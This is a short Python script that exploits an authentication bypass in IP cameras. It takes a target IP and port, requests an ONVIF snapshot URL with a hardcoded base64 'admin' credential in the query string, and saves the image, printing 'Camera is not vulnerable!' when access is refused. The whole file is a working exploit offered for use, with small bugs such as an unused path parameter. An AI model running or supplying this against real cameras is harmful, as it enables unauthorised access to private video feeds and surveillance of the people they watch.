import requests
import random

ip = input("Enter IP: ")
port = input("Enter Port: ")
final = "http://" + ip + ":" + port + "/onvif-http/snapshot?auth=YWRtaW46MTEK"
print(final)

def download(url, path):
    try:
        response = requests.get(url)
        response.raise_for_status()

        with open(save_path, 'wb') as file:
            file.write(response.content)
        print("Snapshot Saved")

    except requests.exceptions.HTTPError as e:
        if response.status_code == 401:
            print("Camera is not vulnerable! Error 401")
        else:
            print("HTTP Error: {e}")
    except requests.exceptions.RequestException as e:
        print(f"Unknown Error: {e}")
        
random_numbers = [str(random.randint(0, 9)) for _ in range(7)]
random_number_str = ''.join(random_numbers)

save_path = ip + "_" + port + "_" + random_number_str + ".jpg"

download(final, save_path)
exit = input()